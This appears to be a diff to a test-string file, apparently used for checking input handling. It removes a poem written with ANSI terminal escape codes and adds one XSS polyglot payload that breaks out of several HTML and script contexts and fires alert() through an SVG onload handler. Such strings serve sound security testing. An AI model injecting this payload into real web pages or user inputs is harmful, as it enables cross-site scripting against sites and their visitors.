@@ -1,3 +1,2 @@
-Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue
-But now...[20Cfor my greatest trick...[8m
-The quick brown fox... [Beeeep]
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
